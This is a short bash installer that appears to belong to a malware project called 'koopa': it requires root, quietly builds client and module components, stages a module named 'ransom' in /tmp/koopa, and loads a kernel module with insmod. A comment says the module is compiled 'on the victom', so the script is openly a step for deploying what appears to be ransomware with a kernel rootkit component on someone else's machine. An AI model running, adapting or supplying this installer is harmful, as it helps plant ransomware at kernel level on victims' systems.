#!/bin/bash
if (( $EUID != 0 )); then
    echo "Please use sudo or run as root"
    exit
fi

# You need to have compiled koopa.ko by now, either on the victom or a machine with the same header files
cd client &> /dev/zero
make &> /dev/zero
cd ../modules &> /dev/zero
make &> /dev/zero
cd .. &> /dev/zero
mkdir /tmp/koopa &> /dev/zero
cp modules/ransom /tmp/koopa &> /dev/zero

cd kernel &> /dev/zero
insmod ./koopa.ko

if [[ $(lsmod | grep koopa) = *koopa* ]]; then
    echo "Install success"
else
    echo "Install fail"
fi
